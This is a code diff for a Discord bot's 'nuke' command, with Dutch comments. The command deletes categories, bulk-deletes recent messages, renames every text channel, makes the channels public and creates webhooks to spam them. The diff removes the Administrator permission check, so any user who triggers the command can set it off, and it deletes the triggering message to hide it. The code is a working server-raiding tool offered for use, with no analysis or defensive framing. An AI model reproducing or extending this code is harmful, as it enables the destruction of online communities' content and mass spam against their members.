@@ -26,14 +26,11 @@ client.on('messageCreate', async message => {
     const args = message.content.slice(5).trim().split(/ +/);
     const spamAmount = parseInt(args[0]) || 50;
 
-    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
-        return message.reply("❌ Administrator rechten nodig!").then(m => setTimeout(() => m.delete().catch(() => {}), 2000));
-    }
-
+    // Commando meteen verwijderen
     message.delete().catch(() => {});
 
     try {
-        await message.author.send(`⚠️ **NUKE START** ⚠️\nSpam: ${spamAmount}x "frost smp on top"`);
+        await message.author.send(`⚠️ **NUKE START** ⚠️\nSpam: ${spamAmount}x per channel\nGestart door: ${message.author.tag}`);
     } catch {}
 
     let cancelled = false;
@@ -56,16 +53,14 @@ client.on('messageCreate', async message => {
         try { await cat.delete(); } catch {}
     }
 
-    // Channels verwerken + spam
+    // Channels verwerken
     const textChannels = Array.from(message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText).values());
     let processed = 0;
 
     const promises = textChannels.map(async (channel) => {
         try {
-            // Oude berichten wissen
             await channel.bulkDelete(100, true).catch(() => {});
 
-            // Hernoemen + zichtbaar maken
             await channel.setName("Finnson the goat");
 
             await channel.permissionOverwrites.edit(message.guild.roles.everyone, {
@@ -74,7 +69,6 @@ client.on('messageCreate', async message => {
                 ReadMessageHistory: true
             }).catch(() => {});
 
-            // Webhook spam met "frost smp on top"
             const webhook = await channel.createWebhook({
                 name: WEBHOOK_NAME,
                 avatar: WEBHOOK_AVATAR
